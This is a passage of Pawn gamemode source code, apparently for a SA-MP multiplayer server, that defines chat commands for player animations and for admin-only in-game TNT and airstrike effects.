                case 18:{ LoopingAnim(playerid, "DANCING", "DNCE_M_E", 4.0, 1, 0, 0, 0, 0); AnimPlay[playerid] = 1; }
                case 19:{ LoopingAnim(playerid, "STRIP", "STR_LOOP_A", 4.0, 1, 0, 0, 0, 0); AnimPlay[playerid] = 1; }
                case 20:{ LoopingAnim(playerid, "STRIP", "STR_LOOP_C", 4.0, 1, 0, 0, 0, 0); AnimPlay[playerid] = 1; }
                default: { SendClientMessage(playerid,COL_SYN,"Syntax: /strip <1-18>"); }
        }
        return 1;
    }
    if(!strcmp(cmd,"/face",true))
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        tmp = strtok(cmdtext,idx);
        if(!strlen(tmp)) return SendClientMessage(playerid,COL_SYN,"Syntax: /face <1-3>");
        new anim = strval(tmp);
        if(anim == 1) {LoopingAnim(playerid, "PED", "FACANGER", 4.0, 1, 0, 0, 0, 0);AnimPlay[playerid] = 1;}
        else if(anim == 2) {LoopingAnim(playerid, "PED", "FACGUM", 4.0, 1, 0, 0, 0, 0);AnimPlay[playerid] = 1;}
        else if(anim == 3) {LoopingAnim(playerid, "PED", "FACSURP", 4.0, 1, 0, 0, 0, 0);AnimPlay[playerid] = 1;}
        else return SendClientMessage(playerid,COL_SYN,"Syntax: /face <1-3>");
        return 1;
    }
    if(!strcmp(cmd,"/win",true))
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        tmp = strtok(cmdtext,idx);
        if(!strlen(tmp)) return SendClientMessage(playerid,COL_SYN,"Syntax: /win <1-3>");
        new anim = strval(tmp);
        if(anim == 1) {LoopingAnim(playerid, "CASINO", "MANWIND", 4.0, 1, 0, 0, 0, 0);AnimPlay[playerid] = 1;}
        else if(anim == 2) {LoopingAnim(playerid, "ON_LOOKERS", "SHOUT_02", 4.0, 1, 0, 0, 0, 0);AnimPlay[playerid] = 1;}
        else if(anim == 3) {LoopingAnim(playerid, "OTB", "WTCHRACE_WIN", 4.0, 1, 0, 0, 0, 0);AnimPlay[playerid] = 1;}
        else return SendClientMessage(playerid,COL_SYN,"Syntax: /win <1-3>");
        return 1;
    }
    if(strcmp(cmd,"/figur",true)==0)
    {
    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
    LoopingAnim(playerid, "BENCHPRESS", "GYM_BP_CELEBRATE", 4.0, 1, 0, 0, 0, 0);
    AnimPlay[playerid] = 1;
    return 1;
    }
    if(strcmp(cmd, "/girlkiss", true) == 0)
    {
    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
 AnimPlay[playerid] = 1;
    LoopingAnim(playerid,"BD_FIRE","Grlfrd_Kiss_03",3.0,0,0,0,0,0);
    return 1;
    }
    if(strcmp(cmd,"/loop",true)==0)
    {
    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
    LoopingAnim(playerid, "BEACH", "PARKSIT_W_LOOP", 4.0, 1, 0, 0, 0, 0);
 AnimPlay[playerid] = 1;
    return 1;
    }
    if(strcmp(cmd, "/handsup", true) == 0) {
    if(PlayerHandsCuffed[playerid] == 1)
    {
    SCM(playerid,COLOR_visit,"you can't up your hands when your hands are cuffed.");
    return 1;
    }
    if(OnFreeze[playerid] == 1) {
    SCM(playerid,COLOR_visit,"you can't up your hands when your hands are freezed.");
    return 1;
    }
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
            SetPlayerSpecialAction(playerid,SPECIAL_ACTION_HANDSUP);
            return 1;
    }
    if(strcmp("/dealstance", cmd, true) == 0)
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid,"DEALER","DEALER_IDLE",4.0,1,0,0,0,0);
  AnimPlay[playerid] = 1;
        return 1;
    }
     if(strcmp("/lightcig", cmd, true) == 0)
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid,"SMOKING","M_smk_in",3.0,0,0,0,0,0);
  AnimPlay[playerid] = 1;
        return 1;
    }
     if(strcmp("/elbow", cmd, true) == 0)
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid,"FIGHT_D","FightD_3",4.0,0,1,1,0,0);
  AnimPlay[playerid] = 1;
        return 1;
    }
     if(strcmp("/highthrow", cmd, true) == 0)
    {
       if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid,"GRENADE","WEAPON_throw",4.0,0,0,0,0,0);AnimPlay[playerid] = 1;
        return 1;
    }
     if(strcmp("/lowthrow", cmd, true) == 0)
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid,"GRENADE","WEAPON_throwu",3.0,0,0,0,0,0);AnimPlay[playerid] = 1;
        return 1;
    }
     if(strcmp("/gkick", cmd, true) == 0)
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid,"FIGHT_D","FightD_G",4.0,0,0,0,0,0); AnimPlay[playerid] = 1;
        return 1;
    }
     if(strcmp("/exhaust", cmd, true) == 0)
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid,"PED","IDLE_tired",3.0,1,0,0,0,0); AnimPlay[playerid] = 1;
        return 1;
    }
    if(strcmp(cmd, "/exhausted", true) == 0)
    {
    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid,"FAT","IDLE_tired", 4.0, 1, 0, 0, 0, 0); AnimPlay[playerid] = 1;
        return 1;
    }
     if(strcmp("/carjacked1", cmd, true) == 0)
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid,"PED","CAR_jackedLHS",4.0,0,1,1,1,0); AnimPlay[playerid] = 1;
        return 1;
    }
     if(strcmp("/carjacked2", cmd, true) == 0)
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid,"PED","CAR_jackedRHS",4.0,0,1,1,1,0); AnimPlay[playerid] = 1;
        return 1;
    }
     if(strcmp("/hide", cmd, true) == 0)
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid, "ped", "cower", 3.0, 1, 0, 0, 0, 0); AnimPlay[playerid] = 1;
        return 1;
    }
     if(strcmp("/lcarjack1", cmd, true) == 0)
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid,"PED","CAR_pulloutL_RHS",4.0,0,0,0,0,0); AnimPlay[playerid] = 1;
        return 1;
    }
     if(strcmp("/lcarjack2", cmd, true) == 0)
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid,"PED","CAR_pullout_RHS",4.0,0,0,0,0,0); AnimPlay[playerid] = 1;
        return 1;
    }
     if(strcmp("/rcarjack1", cmd, true) == 0)
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid,"PED","CAR_pulloutL_LHS",4.0,0,0,0,0,0); AnimPlay[playerid] = 1;
        return 1;
    }
     if(strcmp("/rcarjack2", cmd, true) == 0)
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid,"PED","CAR_pullout_LHS",4.0,0,0,0,0,0); AnimPlay[playerid] = 1;
        return 1;
    }
     if(strcmp(cmd, "/gwalk", true) == 0)
    {
    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        if (!strlen(cmdtext[6])) return SendClientMessage(playerid,COLOR_GRAD3,"USAGE: /gwalk [1/2]");
        new style = strval(cmdtext[6]);
        if (style == 1)
            {
            LoopingAnim(playerid,"PED","WALK_gang1",4.1,1,1,1,1,1); AnimPlay[playerid] = 1;
            }
            else if (style == 2)
            {
            LoopingAnim(playerid,"PED","WALK_gang2",4.1,1,1,1,1,1); AnimPlay[playerid] = 1;
            }
        else SendClientMessage(playerid,COLOR_GRAD3,"USAGE: /gwalk [1/2]");
        return 1;
    }
     if(strcmp("/airkick", cmd, true) == 0)
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid,"FIGHT_C","FightC_M",4.0,0,1,1,0,0); AnimPlay[playerid] = 1;
        return 1;
    }
     if(strcmp("/carjack2", cmd, true) == 0)
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid,"PED","CAR_pullout_LHS",4.0,0,0,0,0,0); AnimPlay[playerid] = 1;
        return 1;
    }
     if(strcmp("/carjack1", cmd, true) == 0)
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid,"PED","CAR_pulloutL_RHS",4.0,0,0,0,0,0);AnimPlay[playerid] = 1;
        return 1;
    }
     if(strcmp("/leftslap", cmd, true) == 0)
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid,"PED","BIKE_elbowL",4.0,0,0,0,0,0);AnimPlay[playerid] = 1;
        return 1;
    }
     if(strcmp("/spray", cmd, true) == 0)
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid,"GANGS","shake_cara",4.0,0,0,0,0,0);AnimPlay[playerid] = 1;
        return 1;
    }
     if(strcmp("/dealstance", cmd, true) == 0)
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid,"DEALER","DEALER_IDLE",4.0,1,0,0,0,0);AnimPlay[playerid] = 1;
        return 1;
    }
     if(strcmp("/box", cmd, true) == 0)
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid,"GYMNASIUM","GYMshadowbox",4.0,1,1,1,1,0);AnimPlay[playerid] = 1;
        return 1;
    }
     if(strcmp("/headbutt", cmd, true) == 0)
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid,"WAYFARER","WF_Fwd",4.0,0,0,0,0,0);AnimPlay[playerid] = 1;
        return 1;
    }
     if(strcmp("/push", cmd, true) == 0)
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid,"SPRAYCAN","spraycan_full",4.0,0,0,0,0,0);AnimPlay[playerid] = 1;
        return 1;
    }
    if(strcmp(cmd, "/sup", true) == 0)
    {
    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        if (!strlen(cmdtext[5])) return SendClientMessage(playerid,COLOR_GRAD3,"USAGE: /sup [1-7]");
        switch (cmdtext[5])
        {
                case '1': { LoopingAnim(playerid,"GANGS","hndshkba",4.0,0,0,0,0,0); AnimPlay[playerid] = 1; }
                case '2': { LoopingAnim(playerid,"GANGS","hndshkda",4.0,0,0,0,0,0); AnimPlay[playerid] = 1; }
                case '3': { LoopingAnim(playerid,"GANGS","hndshkfa_swt",4.0,0,0,0,0,0); AnimPlay[playerid] = 1; }
                case '4': { LoopingAnim(playerid,"GANGS","hndshkaa",4.0,0,0,0,0,0); AnimPlay[playerid] = 1; }
                case '5': { LoopingAnim(playerid,"GANGS","hndshkcb",4.0,0,0,0,0,0); AnimPlay[playerid] = 1; }
                case '6': { LoopingAnim(playerid,"GANGS","hndshkca",4.0,0,0,0,0,0); AnimPlay[playerid] = 1; }
                case '7': { LoopingAnim(playerid,"GANGS","hndshkea",4.0,0,0,0,0,0); AnimPlay[playerid] = 1; }
                default: { SendClientMessage(playerid,COLOR_GRAD3,"USAGE: /sup [1-7]"); }
        }
        return 1;
    }
    if(strcmp(cmd, "/stretch", true) == 0)
    {
    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid,"PLAYIDLES","stretch",4.0,0,0,0,0,0); AnimPlay[playerid] = 1;
        return 1;
    }
     if(strcmp("/slapass", cmd, true) == 0)
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid, "SWEET", "sweet_ass_slap", 4.0, 0, 0, 0, 0, 0);AnimPlay[playerid] = 1;
        return 1;
    }
    if(strcmp(cmd, "/angry", true) == 0)
    {
    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid,"RIOT","RIOT_ANGRY",4.0,0,0,0,0,0); AnimPlay[playerid] = 1;
        return 1;
    }
     if(strcmp("/fucku", cmd, true) == 0 || strcmp("/hooo", cmd, true) == 0)
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid,"PED","fucku",4.0,0,0,0,0,0);
        return 1;
    }
     if(strcmp("/crossarms", cmd, true) == 0)
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        tmp = strtok(cmdtext,idx);
        if(!strlen(tmp)) return SendClientMessage(playerid,COL_SYN,"Syntax: /crossarms <1-2>");
        new anim = strval(tmp);
        if(anim == 1) {LoopingAnim(playerid, "COP_AMBIENT", "Coplook_loop", 4.0, 0, 1, 1, 1, -1);AnimPlay[playerid] = 1;}
        else if(anim == 2) {LoopingAnim(playerid, "OTB", "WTCHRACE_LOOP", 4.0, 1, 0, 0, 0, 0);AnimPlay[playerid] = 1;}
        else return SendClientMessage(playerid,COL_SYN,"Syntax: /crossarms <1-2>");
        return 1;
    }

     if(strcmp(cmd, "/dance", true) == 0) {
     if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
     if(PlayerHandsCuffed[playerid] == 1)
     {
     SCM(playerid,COLOR_visit,"you can't dance when your hands are cuffed");
     return 1;
     }

                tmp = strtok(cmdtext, idx);
                        if(!strlen(tmp)) {
                                SendClientMessage(playerid,COLOR_GRAD3,"USAGE: /dance [Style 1-4]");
                                return 1;
                        }

                        dancestyle = strval(tmp);
                        if(dancestyle < 1 || dancestyle > 4) {
                            SendClientMessage(playerid,COLOR_GRAD3,"USAGE: /dance [Style 1-4]");
                            return 1;
                        }

                        if(dancestyle == 1) {
                            SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE1);
                        } else if(dancestyle == 2) {
                            SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE2);
                        } else if(dancestyle == 3) {
                            SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE3);
                        } else if(dancestyle == 4) {
                            SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE4);
                        }
                        return 1;
        }
      if(strcmp(cmd, "/aim", true) == 0)
    {
    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        if (!strlen(cmdtext[5])) return SendClientMessage(playerid,COLOR_GRAD3,"USAGE: /aim [1-3]");
        switch (cmdtext[5])
        {
                case '1': { LoopingAnim(playerid,"PED","gang_gunstand",4.0,1,1,1,1,1); AnimPlay[playerid] = 1; }
                case '2': { LoopingAnim(playerid,"PED","Driveby_L",4.0,0,1,1,1,1); AnimPlay[playerid] = 1; }
                case '3': { LoopingAnim(playerid,"PED","Driveby_R",4.0,0,1,1,1,1); AnimPlay[playerid] = 1; }
                default: { SendClientMessage(playerid,COLOR_GRAD3,"USAGE: /aim [1-3]"); }
        }
        return 1;
    }
     if(strcmp(cmd, "/lean", true) == 0)
    {
    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        if (!strlen(cmdtext[6])) return SendClientMessage(playerid,COLOR_GRAD3,"USAGE: /lean [1-2]");
        switch (cmdtext[6])
        {
                case '1': { LoopingAnim(playerid,"GANGS","leanIDLE",4.0,0,1,1,1,0); AnimPlay[playerid] = 1; }
                case '2': { LoopingAnim(playerid,"MISC","Plyrlean_loop",4.0,0,1,1,1,0); AnimPlay[playerid] = 1; }
                default: { SendClientMessage(playerid,COLOR_GRAD3,"USAGE: /lean [1-2]"); }
        }
        return 1;
    }
     if(strcmp(cmd, "/reload", true) == 0)
    {
    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        if (!strlen(cmdtext[8])) return SendClientMessage(playerid,COLOR_GRAD3,"USAGE: /reload [deagle/smg/ak/m4]");
        if (strcmp("deagle",cmdtext[8],true) == 0)
            {
                        LoopingAnim(playerid, "COLT45", "COLT45_RELOAD", 4.0, 1, 0, 0, 0, 0);AnimPlay[playerid] = 1;
            }
            else if (strcmp("smg",cmdtext[8],true) == 0 || strcmp("ak",cmdtext[8],true) == 0 || strcmp("m4",cmdtext[8],true) == 0)
            {
                        LoopingAnim(playerid,"UZI","UZI_reload",4.0,0,0,0,0,0);AnimPlay[playerid] = 1;
            }
        else SendClientMessage(playerid,COLOR_GRAD3,"USAGE: /reload [deagle/smg/ak/m4]");
        return 1;
    }
    if(strcmp(cmd, "/knife", true) == 0)
    {
    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        if (!strlen(cmdtext[7])) return SendClientMessage(playerid,COLOR_GRAD3,"USAGE: /knife [1-4]");
        switch (cmdtext[7])
        {
            case '1': { LoopingAnim(playerid,"KNIFE","KILL_Knife_Ped_Damage",4.0,0,1,1,1,0); AnimPlay[playerid] = 1; }
                case '2': { LoopingAnim(playerid,"KNIFE","KILL_Knife_Ped_Die",4.0,0,1,1,1,0); AnimPlay[playerid] = 1; }
                case '3': { LoopingAnim(playerid,"KNIFE","KILL_Knife_Player",4.0,0,0,0,0,0); AnimPlay[playerid] = 1; }
                case '4': { LoopingAnim(playerid,"KNIFE","KILL_Partial",4.0,0,1,1,1,1); AnimPlay[playerid] = 1; }
                default: SendClientMessage(playerid,COLOR_GRAD3,"USAGE: /knife [1-4]");
        }
        return 1;
    }
     if(strcmp(cmd, "/basket", true) == 0)
    {
    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        if (!strlen(cmdtext[8])) return SendClientMessage(playerid,COLOR_GRAD3,"USAGE: /basket [1-6]");
        switch (cmdtext[8])
        {
                case '1': { LoopingAnim(playerid,"BSKTBALL","BBALL_idleloop",4.0,1,0,0,0,0); AnimPlay[playerid] = 1; }
                case '2': { LoopingAnim(playerid,"BSKTBALL","BBALL_Jump_Shot",4.0,0,0,0,0,0); AnimPlay[playerid] = 1; }
                case '3': { LoopingAnim(playerid,"BSKTBALL","BBALL_pickup",4.0,0,0,0,0,0); AnimPlay[playerid] = 1; }
                case '4': { LoopingAnim(playerid,"BSKTBALL","BBALL_run",4.1,1,1,1,1,1); AnimPlay[playerid] = 1; }
                case '5': { LoopingAnim(playerid,"BSKTBALL","BBALL_def_loop",4.0,1,0,0,0,0); AnimPlay[playerid] = 1; }
                case '6': { LoopingAnim(playerid,"BSKTBALL","BBALL_Dnk",4.0,1,0,0,0,0); AnimPlay[playerid] = 1; }
                default: SendClientMessage(playerid,COLOR_GRAD3,"USAGE: /basket [1-6]");
        }
        return 1;
    }
    if(strcmp(cmd, "/rap", true) == 0)
    {
    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        if (!strlen(cmdtext[5])) return SendClientMessage(playerid,COLOR_GRAD3,"USAGE: /rap [1-4]");
        switch (cmdtext[5])
        {
            case '1': { LoopingAnim(playerid,"RAPPING","RAP_A_Loop",4.0,1,0,0,0,0); AnimPlay[playerid] = 1; }
                case '2': { LoopingAnim(playerid,"RAPPING","RAP_C_Loop",4.0,1,0,0,0,0); AnimPlay[playerid] = 1; }
                case '3': { LoopingAnim(playerid,"GANGS","prtial_gngtlkD",4.0,1,0,0,0,0); AnimPlay[playerid] = 1; }
                case '4': { LoopingAnim(playerid,"GANGS","prtial_gngtlkH",4.0,1,0,0,1,1); AnimPlay[playerid] = 1; }
                default: SendClientMessage(playerid,COLOR_GRAD3,"USAGE: /rap [1-4]");
        }
        return 1;
    }
     if(strcmp("/gro", cmd, true) == 0)
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid,"BEACH", "ParkSit_M_loop", 4.0, 1, 0, 0, 0, 0);AnimPlay[playerid] = 1;
        return 1;
    }



   if(strcmp("/atishbazi", cmd, true) == 0)
    {
                        if(PINFO[playerid][pAdmin] <= 0) return ErrorMessage1(playerid);
	                    if(GetPlayerPool(playerid) < 500)
                        {
                            SendClientMessage(playerid, COLOR_GRAD5, "Shoma Pool Kafi Nadarid (500$)");
                            return 1;
                        }
					    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
                        new Float:x,Float:y,Float:z;
                        GetPlayerPos(playerid,x,y,z);
						GivePlayerPool(playerid,-500);
						GameTextForPlayer(playerid, "~r~-$500", 5000, 1);
						LoopingAnim(playerid, "BOMBER", "BOM_Plant", 4.0, 1, 0, 0, 0, 0);
						AnimPlay[playerid] = 1;
                        SetTimerEx("AnimTNT",1000,false,"dfffd",playerid,x,y,z,1);
                        Airstrike[playerid] = 19;
                        Flare[playerid] = CreateObject(18728,x,y,z-3,0.000000,0.000000,0.000000);
                        TearGas[playerid] = CreateObject(343,x,y,z-1,0.000000,0.000000,0.000000);
                        Airstriking[playerid] = 1;
                        SetTimerEx("AirstrikeGo",5000,false,"dfffd",playerid,x,y,z,19);
						new strs[500];
						GetPlayerName(playerid, giveplayer, sizeof(giveplayer));
						format(strs,500,"{00FFFF}Bazikon {FFFFFF}%s[%i] {00FFFF}Az CMD {57e547}/atishbazi {00FFFF}Estefade kard.",giveplayer,playerid);
						AdminWarn(strs);
        return 1;
    }
		     if(strcmp("/tnt", cmd, true) == 0)
    {
                        if(PINFO[playerid][pAdmin] <= 0) return ErrorMessage1(playerid);
	                    if(GetPlayerPool(playerid) < 500)
                        {
                            SendClientMessage(playerid, COLOR_GRAD5, "Shoma Pool Kafi Nadarid (500$)");
                            return 1;
                        }
					    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
						if(Airstriking[playerid] == 1) return SendClientMessage(playerid,0xFF0000AA,"Please Wait");
                        new Float:x,Float:y,Float:z;
                        GetPlayerPos(playerid,x,y,z);
						GivePlayerPool(playerid,-500);
						GameTextForPlayer(playerid, "~r~-$500", 5000, 1);
						LoopingAnim(playerid, "BOMBER", "BOM_Plant", 4.0, 1, 0, 0, 0, 0);
						AnimPlay[playerid] = 1;
                        SetTimerEx("AnimTNT",1000,false,"dfffd",playerid,x,y,z,1);
                        Airstrike[playerid] = 2;
                        Flare[playerid] = CreateObject(18728,x,y,z-3,0.000000,0.000000,0.000000);
                        TearGas[playerid] = CreateObject(343,x,y,z-1,0.000000,0.000000,0.000000);
                        Airstriking[playerid] = 1;
                        SetTimerEx("AirstrikeGo",10000,false,"dfffd",playerid,x,y,z,2);
						new strs[500];
						GetPlayerName(playerid, giveplayer, sizeof(giveplayer));
						format(strs,500,"{00FFFF}Bazikon {FFFFFF}%s[%i] {00FFFF}Az CMD {57e547}/tnt {00FFFF}Estefade kard.",giveplayer,playerid);
						AdminWarn(strs);
        return 1;
    }

    if(!strcmp(cmd, "/copmove",true))
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        AnimPlay[playerid] = 1;
        LoopingAnim(playerid, "POLICE", "COP_MOVE_FWD", 4.0, 1, 1, 1, 0, 0);
        return 1;
    }
    if(!strcmp(cmd, "/cop",true))
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid, "SWORD", "sword_block", 4.0, 0, 1, 1, 1, 1);
        AnimPlay[playerid] = 1;
        return 1;
    }
     if(strcmp("/fall", cmd, true) == 0)
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        tmp = strtok(cmdtext,idx);
        if(!strlen(tmp)) return SCM(playerid,COL_SYN, "Syntax: /fall <1-3>");
        new anim = strval(tmp);
        if(anim == 1){LoopingAnim(playerid,"PED","KO_skid_front",4.1,0,1,1,1,0);AnimPlay[playerid] = 1;}
        else if(anim == 2){LoopingAnim(playerid, "BASEBALL", "BAT_HIT_3", 4.0, 0, 1, 1, 1, 0);AnimPlay[playerid] = 1;}
        else if(anim == 3){LoopingAnim(playerid, "PED", "FLOOR_HIT", 4.0, 1, 0, 0, 0, 0);AnimPlay[playerid] = 1;}
        else return SCM(playerid,COL_SYN, "Syntax: /fall <1-3>");
        return 1;
    }
     if(strcmp("/fallback", cmd, true) == 0)
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid, "PED","FLOOR_hit_f", 4.0, 1, 0, 0, 0, 0);AnimPlay[playerid] = 1;
        return 1;
    }
     if(strcmp("/carlock", cmd, true) == 0)
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid,"PED","CAR_doorlocked_LHS",4.0,0,0,0,0,0);AnimPlay[playerid] = 1;
        return 1;
    }
     if(strcmp("/lay2", cmd, true) == 0)
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid,"SUNBATHE","Lay_Bac_in",3.0,0,1,1,1,0);AnimPlay[playerid] = 1;
        return 1;
    }
if(strcmp(cmd, "/lay", true) == 0)
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
        LoopingAnim(playerid,"BEACH", "bather", 4.0, 1, 0, 0, 0, 0);AnimPlay[playerid] = 1;
        return 1;
    }
    if (strcmp("/lay3", cmd, true, 6) == 0)
    {
    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) { SCM(playerid,COLOR_ALI,"Cannot use that when you are not On-Foot."); return 1; }
